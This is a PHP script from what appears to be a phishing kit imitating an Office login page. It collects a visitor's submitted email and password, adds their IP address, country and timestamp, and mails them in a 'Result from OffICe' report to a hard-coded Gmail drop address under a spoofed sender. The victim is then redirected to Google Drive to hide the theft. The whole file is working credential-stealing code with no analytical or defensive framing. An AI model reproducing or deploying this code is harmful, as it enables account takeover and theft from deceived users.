<?php
session_start();
$_SESSION['Pdf3'] = $_POST['pdf3'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$send = 'sheezie47@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'result@donking.net';
$domain = 'Result from OffICe';
$subj = "$domain | $country";
$headers .= "From: OffICe<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'http://drive.google.com/file/d';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________OffICe LoG_________</td></tr>
 <tr><td><STRONG>EMail I.D: $email<td/></tr>
 <tr><td><STRONG>Password: $password</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>country : $country</td></tr>
 <tr><td>_____cReAtEd By VeNzA______</td></tr>
 </BODY>
 </HTML>";
if (empty($email) || empty($password)) {
header( "Location: http://drive.google.com/file/d" );
}
else {
mail($send,$subj,$msg,$headers);
header("Location: $over");
}
?>
